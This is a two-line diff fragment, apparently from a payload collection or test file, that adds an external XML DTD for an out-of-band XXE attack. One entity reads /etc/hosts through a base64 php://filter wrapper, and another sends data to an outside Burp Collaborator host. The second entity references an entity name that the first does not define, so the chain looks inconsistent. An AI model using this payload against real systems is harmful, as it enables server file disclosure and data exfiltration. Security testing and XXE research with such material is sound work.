@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/hosts">
+<!ENTITY % all "<!ENTITY  send SYSTEM 'http://u1w0qu2lgl5if9j34sloe5r1hsnjsfi37.burpcollaborator.net/?%id;'>">
